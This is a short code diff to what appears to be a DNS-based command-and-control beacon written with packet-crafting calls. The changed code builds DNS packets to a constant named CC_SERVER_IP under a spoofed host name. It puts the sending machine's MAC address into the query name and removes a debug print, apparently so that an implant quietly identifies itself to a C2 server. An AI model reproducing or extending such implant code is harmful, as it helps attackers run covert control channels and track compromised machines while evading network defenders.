@@ -13,7 +13,7 @@ class PingRequest:
         pass
     
     def build(self):
-        mac_addr = ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2)).lower() 
+        mac_addr = ''.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2)).lower() 
 
         ether = Ether(src=mac_addr)
         ip = IP(dst=CC_SERVER_IP)
@@ -21,11 +21,10 @@ class PingRequest:
         dns = DNS(
             qr=PACKET_OPTIONS['DNS']['QR'],
             qdcount=1,
-            qd=DNSQR(qname=CC_SERVER_SPOOFED_HOST, qtype=RequestType.PING.value)
+            qd=DNSQR(qname=mac_addr + '.' + CC_SERVER_SPOOFED_HOST, qtype=RequestType.PING.value)
         )
 
         return ether/ip/udp/dns
     
     def send(self):
-        print(self.build().show())
         sendp(x=self.build(), iface=INTERFACE, verbose=0)
